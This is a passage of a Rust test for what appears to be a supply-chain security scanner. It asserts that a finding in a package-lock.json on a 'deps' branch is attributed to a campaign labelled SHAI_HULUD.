    let report = scan(&tar_dir(dir.path()));
    let lock = report.findings.iter().find(|f| f.path == "pack/package-lock.json").expect("found on the branch");
    assert_eq!((lock.branch.as_deref(), lock.campaign.as_deref()), (Some("deps"), Some(campaigns::SHAI_HULUD)));
}
